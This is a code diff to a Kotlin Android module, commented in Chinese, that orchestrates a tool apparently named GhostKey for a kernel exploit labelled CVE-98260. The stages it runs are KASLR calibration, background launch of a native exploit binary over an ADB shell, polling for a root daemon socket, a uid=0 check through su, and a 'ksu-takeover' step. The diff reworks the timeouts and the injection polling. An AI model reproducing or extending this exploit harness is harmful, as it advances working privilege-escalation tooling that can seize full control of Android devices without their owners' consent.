@@ -28,15 +28,18 @@ internal object Cve98260Status {
     const val SKIPPED = "skipped"
 }
 
-private const val CALIB_A_TIMEOUT_MS = 60_000L
-private const val CALIB_B_TIMEOUT_MS = 75_000L
-private const val INJECT_TIMEOUT_MS = 120_000L
-private const val VERIFY_TIMEOUT_MS = 15_000L
-private const val KSU_TIMEOUT_MS = 90_000L
+/** 阶段命令不设时限：`0` 交给 [AdbShellChannel] 表示不限时，由用户手动取消。 */
+private const val STAGE_TIMEOUT_MS = 0L
 private const val CANCEL_TIMEOUT_MS = 10_000L
 private const val SETUP_TIMEOUT_MS = 5_000L
 private const val READ_TIMEOUT_MS = 5_000L
-private const val SOCKET_PROBE_TIMEOUT_MS = 3_000L
+
+/** 注入成功后等 rootd 就绪的上限；超时判失败，不去动设备侧进程。 */
+private const val INJECT_WAIT_MS = 300_000L
+private const val INJECT_POLL_MS = 800L
+
+/** 主进程已退出但 socket 还没出现时的宽限：child fork rootd 后才 ack，存在毫秒级窗口。 */
+private const val INJECT_GONE_GRACE_MS = 10_000L
 
 private const val EXIT_CALIB_A = 2
 private const val EXIT_CALIB_B = 3
@@ -48,6 +51,22 @@ private const val KSUD_NAME = "libksud.so"
 private const val RESULT_SLIDE = "slide.txt"
 private const val RESULT_PAGE_OFFSET = "page_offset.txt"
 private const val RESULT_PAGE_OFFSET_SCORE = "page_offset.score"
+private const val INJECT_PROFILE = "exploit-profile.bin"
+private const val INJECT_LOG = "exploit.log"
+
+/** rootd 自报就绪；见 pc98260_rootd.c。 */
+private const val ROOTD_READY = "C98260_ROOTD_READY=1"
+
+/** 轮询用的行内标记，不属于原生输出。 */
+private const val MARK_SOCKET = "__C98260_SOCKET_UP__"
+private const val MARK_DEAD = "__C98260_PROC_GONE__"
+
+/** 注入失败后原生会 pause() 常驻，提前用它收尾，别等到超时。 */
+private val INJECT_FAILURE_MARKS = listOf(
+    "[uaf] missed page",
+    "cred escalation not effective",
+    "binding failed",
+)
 
 /**
  * 一次 GhostKey 运行的五阶段编排。
@@ -72,6 +91,11 @@ internal class Cve98260Session(
     private val socketPath: String = "$WORK_DIR/pc98260-$roundId.sock"
 
     private val stopFilePath: String = "$WORK_DIR/pc98260-$roundId.stop"
+
+    /** 注入阶段专用：profile 落盘给后台进程读，日志落盘给本侧增量读。 */
+    private val injectProfilePath: String = "$WORK_DIR/$INJECT_PROFILE"
+
+    private val injectLogPath: String = "$WORK_DIR/$INJECT_LOG"
 
     private val lock = Any()
 
@@ -186,7 +210,7 @@ internal class Cve98260Session(
 
     private fun runCalibA(): Int {
         emit(Cve98260Stage.CALIB_A, Cve98260Status.RUNNING)
-        val r = exec(cmd("$binPath calibrate-a"), CALIB_A_TIMEOUT_MS, blob)
+        val r = exec(cmd("$binPath calibrate-a"), STAGE_TIMEOUT_MS, blob)
         append(r)
         val text = readText(RESULT_SLIDE)
         if (text.isNullOrEmpty()) {
@@ -202,7 +226,7 @@ internal class Cve98260Session(
         emit(Cve98260Stage.CALIB_B, Cve98260Status.RUNNING)
         val r = exec(
             cmd("$binPath calibrate-b --slide $slide"),
-            CALIB_B_TIMEOUT_MS,
+            STAGE_TIMEOUT_MS,
             blob,
         )
         append(r)
@@ -227,27 +251,106 @@ internal class Cve98260Session(
 
     private fun runInject(): Int {
         emit(Cve98260Stage.INJECT, Cve98260Status.RUNNING)
-        val r = exec(
-            cmd("$binPath exploit --slide $slide --page-offset $pageOffset --daemon-exit"),
-            INJECT_TIMEOUT_MS,
-            blob,
+        // 后台启动后 stdin 管道就断了，profile 先落盘，让子命令从文件读。
+        val staged = exec("cat > $injectProfilePath", SETUP_TIMEOUT_MS, blob)
+        if (staged.timedOut || staged.exitCode != 0) {
+            append(staged)
+            emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
+            return EXIT_INJECT
+        }
+        exec("rm -f $injectLogPath $socketPath", SETUP_TIMEOUT_MS, null)
+
+        // 只负责拉起，不等退出：成功时主进程自行退出、cred 子进程常驻钉页；
+        // 失败时原生 pause() 永不返回，阻塞等待就必然卡死。
+        val launch = exec(
+            cmd(
+                "$binPath exploit --slide $slide --page-offset $pageOffset " +
+                    "--daemon-exit < $injectProfilePath > $injectLogPath 2>&1 & echo \$!",
+            ),
+            SETUP_TIMEOUT_MS,
+            null,
         )
-        append(r)
-        if (r.timedOut) {
-            emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
-            return EXIT_INJECT
+        // `echo $!` 的 stdout 只是 pid，不进日志；stderr 若有内容才是启动失败的原因。
+        if (launch.stderr.isNotEmpty()) append(launch)
+        val pid = launch.stdout.lineSequence().lastOrNull()?.trim()?.toIntOrNull() ?: -1
+
+        val deadline = SystemClock.elapsedRealtime() + INJECT_WAIT_MS
+        var goneAt = 0L
+        var offset = 0
+        while (SystemClock.elapsedRealtime() < deadline) {
+            if (cancelled) {
+                emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
+                return EXIT_INJECT
+            }
+            val polled = pollInject(pid, offset)
+            offset = polled.logSize
+            if (polled.text.isNotEmpty()) {
+                appendText(polled.text)
+                if (INJECT_FAILURE_MARKS.any { polled.text.contains(it) }) {
+                    emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
+                    return EXIT_INJECT
+                }
+            }
+            if (polled.socketReady) {
+                emit(Cve98260Stage.INJECT, Cve98260Status.OK)
+                return 0
+            }
+            val now = SystemClock.elapsedRealtime()
+            if (polled.processGone) {
+                if (goneAt == 0L) goneAt = now
+                // 主进程退出时 rootd 可能还没 bind 完，给一段宽限再判死。
+                if (now - goneAt > INJECT_GONE_GRACE_MS) {
+                    appendText("[inject] exploit exited before rootd was ready\n")
+                    emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
+                    return EXIT_INJECT
+                }
+            } else {
+                goneAt = 0L
+            }
+            Thread.sleep(INJECT_POLL_MS)
         }
-        if (!waitSocket()) {
-            emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
-            return EXIT_INJECT
+        appendText("[inject] rootd not ready in ${INJECT_WAIT_MS / 1000}s, giving up\n")
+        emit(Cve98260Stage.INJECT, Cve98260Status.FAILED)
+        return EXIT_INJECT
+    }
+
+    /**
+     * 一次注入轮询：取日志增量 + 看 socket 是否就绪 + 看主进程是否已消失。
+     *
+     * 偏移量取自 `wc -c` 的真实字节数，而不是把读回的行拼起来算长度——
+     * 后者会因为换行/标记行的增删导致游标漂移，日志就会重复或丢行。
+     */
+    private fun pollInject(pid: Int, offset: Int): InjectPoll {
+        val pidCheck = if (pid > 0) "test -d /proc/$pid || echo $MARK_DEAD; " else ""
+        val state = exec(
+            "test -S $socketPath && echo $MARK_SOCKET; " +
+                pidCheck +
+                "wc -c < $injectLogPath 2>/dev/null",
+            READ_TIMEOUT_MS,
+            null,
+        )
+        val socketReady = state.stdout.contains(MARK_SOCKET)
+        val processGone = pid > 0 && state.stdout.contains(MARK_DEAD)
+        val logSize = state.stdout.lineSequence()
+            .map { it.trim() }
+            .lastOrNull { it.isNotEmpty() && it.all(Char::isDigit) }
+            ?.toIntOrNull() ?: offset
+        val text = if (logSize > offset) {
+            exec("tail -c +${offset + 1} $injectLogPath 2>/dev/null", READ_TIMEOUT_MS, null).stdout
+        } else {
+            ""
         }
-        emit(Cve98260Stage.INJECT, Cve98260Status.OK)
-        return 0
+        return InjectPoll(
+            text = text,
+            logSize = logSize,
+            socketReady = socketReady || text.contains(ROOTD_READY),
+            processGone = processGone,
+        )
     }
 
     private fun runVerify(): Int {
         emit(Cve98260Stage.VERIFY, Cve98260Status.RUNNING)
-        val r = exec(cmd("$binPath su -c id"), VERIFY_TIMEOUT_MS, null)
+        val r = exec(cmd("$binPath su -c id"), STAGE_TIMEOUT_MS, null)
         append(r)
         if (!r.stdout.contains("uid=0")) {
             emit(Cve98260Stage.VERIFY, Cve98260Status.FAILED)
@@ -271,23 +374,13 @@ internal class Cve98260Session(
             emit(Cve98260Stage.KSU, Cve98260Status.FAILED)
             return 0
         }
-        val r = exec(cmd("$binPath ksu-takeover"), KSU_TIMEOUT_MS, blob)
+        val r = exec(cmd("$binPath ksu-takeover"), STAGE_TIMEOUT_MS, blob)
         append(r)
         emit(
             Cve98260Stage.KSU,
             if (r.exitCode == 0) Cve98260Status.OK else Cve98260Status.FAILED,
         )
         return 0
-    }
-
-    /** rootd socket 出现即视为注入完成；最多 15 × 1 s。 */
-    private fun waitSocket(): Boolean {
-        repeat(15) {
-            val r = exec("test -S $socketPath && echo ok", SOCKET_PROBE_TIMEOUT_MS, null)
-            if (r.stdout.contains("ok")) return true
-            Thread.sleep(1_000L)
-        }
-        return false
     }
 
     private fun finish(code: Int) {
@@ -310,6 +403,10 @@ internal class Cve98260Session(
             if (r.stdout.isNotEmpty()) logBuffer.append(r.stdout)
             if (r.stderr.isNotEmpty()) logBuffer.append(r.stderr)
         }
+    }
+
+    private fun appendText(text: String) {
+        synchronized(lock) { logBuffer.append(text) }
     }
 
     private fun readText(name: String): String? {
@@ -338,3 +435,11 @@ internal class Cve98260Session(
         append("CVE98260_KSU_LOG=$WORK_DIR/ksud.log ")
     }
 }
+
+/** 一次注入轮询的结果：日志增量、日志文件当前字节数、就绪/退出标志。 */
+private class InjectPoll(
+    val text: String,
+    val logSize: Int,
+    val socketReady: Boolean,
+    val processGone: Boolean,
+)
